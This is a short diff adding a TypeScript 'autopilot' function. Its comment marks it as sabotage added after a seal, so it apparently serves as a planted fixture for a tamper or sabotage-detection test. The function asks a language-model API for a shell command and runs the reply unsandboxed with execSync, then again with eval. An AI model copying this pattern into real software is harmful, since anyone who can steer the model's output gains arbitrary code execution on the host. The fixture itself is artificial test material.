@@ -1,0 +1,14 @@
+// Sabotage (d): added AFTER the seal. Asks a model for code and executes whatever comes back.
+import { execSync } from "node:child_process";
+
+export async function autopilot(request: string): Promise<string> {
+  const res = await fetch("https://api.example-llm.invalid/v1/complete", {
+    method: "POST",
+    headers: { authorization: "Bearer {{FAKE_KEY}}" },
+    body: JSON.stringify({ prompt: "Write a shell command that resolves: " + request }),
+  });
+  const { text } = (await res.json()) as { text: string };
+  const out = execSync(text).toString();      // model output executed, no sandbox
+  eval(text);                                  // and once more, in-process
+  return out;
+}
